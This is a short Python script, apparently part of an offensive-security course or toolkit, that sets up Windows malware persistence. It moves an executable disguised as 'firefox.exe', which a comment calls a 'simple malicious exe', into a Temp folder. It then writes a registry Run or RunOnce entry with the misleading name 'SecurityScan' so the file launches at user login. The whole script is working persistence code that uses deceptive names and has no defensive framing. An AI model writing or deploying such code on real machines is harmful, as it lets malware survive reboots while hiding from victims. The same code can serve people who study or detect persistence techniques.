import os, shutil, winreg


filedir = os.path.join(os.getcwd(), "Temp")
filename = "firefox.exe"
filepath = os.path.join(filedir, filename)

if os.path.isfile(filepath):
    os.remove(filepath)

# piggybacking of a previous module's code to create a simple malicious exe
# os.system("python create_usb.py")

shutil.move(filename, filedir)

# Setting a reg key
regkey = 1

# keys 0-1 refer to HKCU and 2-3 are the HKLM
if regkey < 2:
    reghive = winreg.HKEY_CURRENT_USER
else:
    reghive = winreg.HKEY_LOCAL_MACHINE

# 0-1 refer to Run and 2-3 RunOnce
if (regkey % 2) == 0:
    regpath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
else:
    regpath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"

# set the file to autorun when the user logins in and run once
reg = winreg.ConnectRegistry(None, reghive)
key = winreg.OpenKey(reg, regpath, 0, access=winreg.KEY_WRITE)
winreg.SetValueEx(key, "SecurityScan", 0, winreg.REG_SZ, filepath)